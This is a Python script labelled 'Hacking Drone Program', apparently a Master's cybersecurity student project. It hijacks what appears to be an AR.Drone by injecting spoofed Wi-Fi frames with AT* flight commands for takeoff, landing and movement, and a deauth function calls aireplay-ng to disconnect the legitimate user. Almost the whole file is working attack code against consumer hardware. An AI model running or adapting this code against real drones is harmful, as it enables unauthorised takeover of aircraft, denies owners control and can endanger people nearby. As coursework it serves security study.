#!/usr/bin/env python

#############################################
#	Programme Python type					#
#	Auteurs : 	Aurelien Monnet-Paquet		#
#				Francesco Furfaro			#
#				Benoit Peynet				#
#############################################



#############################################
#	Importation de fonctions externes :
from scapy.all import *
import sys
import time
import pygame
from optparse import OptionParser





#############################################
#	Definition locale de fonctions :
def commands():
	print "Commands available :"
	print "\tARROW UP \t: Move forward"
	print "\tARROW DOWN \t: Move backward"
	print "\tARROW RIGHT \t: Move to the right"
	print "\tARROW LEFT \t: Move to the left"
	print "\t--"
	print "\tZ : Increase vertical position"
	print "\tS : Decrease vertical position"
	print "\tQ : Turn left (without movement)"
	print "\tD : Turn right (without movement)"

###################   ZERO PACKET   ###################
def zero():
	global seq

	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
		addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',0,0,0,0,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)


###################   DECOLLAGE   ###################
def takeoff():
	print "Takeoff !!"
	global seq

	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq +1
	payload = Raw(load='AT*REF='+str(seq)+',290718208\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)

###################   ATTERRISSAGE   ###################
def landing():
	print "Landing !!"
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq +1
	payload = Raw(load='AT*REF='+str(seq)+',290717696\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)


###################   MONTE   ###################
def up():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,1045220557,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)

###################   DESCEND   ###################
def down():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,-1045220557,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)

###################   TOURNE A DROITE   ###################
def noseright():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,0,1045220557\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)

###################   TOURNE A GAUCHE   ###################
def noseleft():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,0,-1045220557\r')

	pkt = RadioTap()/dot11h/ipudph/payload

	sendp(pkt,iface='mon0',count=1,verbose=0)


###################   RECULE   ###################
def recule():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,-1045220557,0,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)

###################   AVANCE   ###################
def avance():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,1045220557,0,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)


###################   DEPLACE A DROITE   ###################
def droite():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,1045220557,0,0,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)


###################   DEPLACE A GAUCHE   ###################
def gauche():
	global seq
	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
	seq = seq+1
	payload = Raw(load='AT*PCMD='+str(seq)+',1,-1045220557,0,0,0\r')

	pkt = RadioTap()/dot11h/ipudph/payload
		
	sendp(pkt,iface='mon0',count=1,verbose=0)


###################   DEAUTH USER FUNCTION   ###################
def deauth():
	print "**** Let's DEAUTH the user ! ****"
	rep = raw_input("Broadcast/Target mode ? [B/t]")
	if rep == 'B' or rep == 'b' or rep == '':
		print "Broadcast deauth running"
		os.system("aireplay-ng -0 20 -a 90:03:b7:fd:22:49 mon0")
	else:
		rep = raw_input("Use "+MAC_src+" ? [Y/n]")
		if rep == 'Y' or rep == 'y' or rep == '':
			os.system("aireplay-ng -0 20 -a 90:03:b7:fd:22:49 -c "+MAC_src+" mon0")
		else:
			rep = raw_input("Enter MAC address to deauth : ")
			os.system("aireplay-ng -0 20 -a 90:03:b7:fd:22:49 -c "+rep+" mon0")




#############################################
#	Corps principal du programme
print "#########################################"
print "#  Hacking Drone Program v1.0\t\t#"
print "#  Autors :\tAurelien Monnet-Paquet\t#"
print "#\t\tFrancesco Furfaro\t#"
print "#\t\tBenoit Peynet\t\t#"
print "#  Master 2 CyberSecurity\t\t#"
print "#  Advanced Security\t\t\t#"
print "#########################################"
print "\n"

parser = OptionParser(usage="usage: %prog [options]",
                          version="%prog 1.0")
parser.add_option("-i",
                  dest="ip_address",
                  default='192.168.1.2',
                  help="Use the IP ADDRESS as source")
parser.add_option("-m",
                  dest="MAC_address",
                  default='50:55:27:ef:e9:6d',
                  help="Use the MAC ADDRESS as source",)
parser.add_option("-f",
                  dest="interface",
                  default='mon0',
                  help="Use the INTERFACE",)
parser.add_option("-c",
				  dest="commands",
				  action="store_true",
                  default=False,
                  help="Print all flying commands available",)
parser.add_option("-d",
				  dest="deauth",
				  action="store_true",
                  default=False,
                  help="Deauthenticate user",)
(options, args) = parser.parse_args()

if len(args) > 4:
    parser.error("wrong number of arguments")

# ip_drone = '192.168.1.1'
#MAC_drone = '90:03:b7:fd:22:49'
seq = 1000
ip_src = options.ip_address
MAC_src = options.MAC_address
interface = options.interface
if options.deauth:
	deauth()
if options.commands:
	commands()


## DEBUT DE L'APPLICATION ##
pygame.init()
pygame.display.set_caption('Time to Hack a Drone')
W, H = 320, 240
screen = pygame.display.set_mode((W, H))
#drone = libardrone.ARDrone()
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False 
        # elif event.type == pygame.KEYUP:
        #     drone.hover()
        elif event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                # drone.reset()
                running = False
            # takeoff / land
            elif event.key == pygame.K_RETURN:
				takeoff()
            elif event.key == pygame.K_SPACE:
				landing()
            # emergency
            # elif event.key == pygame.K_BACKSPACE:
            #     drone.reset()
            # Monte / Descend
            elif event.key == pygame.K_z:
                print "Monte"
                for i in xrange(1,10):
            		up()
            		time.sleep(0.1)
            elif event.key == pygame.K_s:
                print "Descend"
                for i in xrange(1,10):
            		down()
            		time.sleep(0.1)
            # Tourne a gauche / droite (pas de deplacement)
            elif event.key == pygame.K_q:
                print "Tourne a gauche"
                # zero()
                # time.sleep(0.4)
            	for i in xrange(1,10):
            		noseleft()
            		time.sleep(0.1)
            	# zero()
            elif event.key == pygame.K_d:
                print "Tourne a droite"
                for i in xrange(1,10):
            		noseright()
            		time.sleep(0.1)
            # Avance / Recule
            elif event.key == pygame.K_UP:
            	print "Avance"
            	for i in xrange(1,10):
            		avance()
            		time.sleep(0.1)
            elif event.key == pygame.K_DOWN:
            	print "Recule"
            	for i in xrange(1,10):
            		recule()
            		time.sleep(0.1)
            # Deplacement a gauche / roite
            elif event.key == pygame.K_LEFT:
            	print "Deplace a gauche"
            	for i in xrange(1,10):
            		gauche()
            		time.sleep(0.1)
            elif event.key == pygame.K_RIGHT:
            	print "Deplace a droite"
            	for i in xrange(1,10):
            		droite()
            		time.sleep(0.1)
            # speed
            # elif event.key == pygame.K_1:
            #     drone.speed = 0.1
            # elif event.key == pygame.K_2:
            #     drone.speed = 0.2
            # elif event.key == pygame.K_3:
            #     drone.speed = 0.3
            # elif event.key == pygame.K_4:
            #     drone.speed = 0.4
            # elif event.key == pygame.K_5:
            #     drone.speed = 0.5
            # elif event.key == pygame.K_6:
            #     drone.speed = 0.6
            # elif event.key == pygame.K_7:
            #     drone.speed = 0.7
            # elif event.key == pygame.K_8:
            #     drone.speed = 0.8
            # elif event.key == pygame.K_9:
            #     drone.speed = 0.9
            # elif event.key == pygame.K_0:
            #     drone.speed = 1.0

    # try:
    #     surface = pygame.image.fromstring(drone.image, (W, H), 'RGB')
    #     battery status
    #     hud_color = (255, 0, 0) if drone.navdata.get('drone_state', dict()).get('emergency_mask', 1) else (10, 10, 255)
    #     bat = drone.navdata.get(0, dict()).get('battery', 0)
    #     f = pygame.font.Font(None, 20)
    #     hud = f.render('Battery: %i%%' % bat, True, hud_color)
    #     screen.blit(surface, (0, 0))
    #     screen.blit(hud, (10, 10))
    # except:
    #     pass

    pygame.display.flip()
    clock.tick(50)
    # pygame.display.set_caption("FPS: %.2f" % clock.get_fps())

print "Shutting down...",
print "Ok."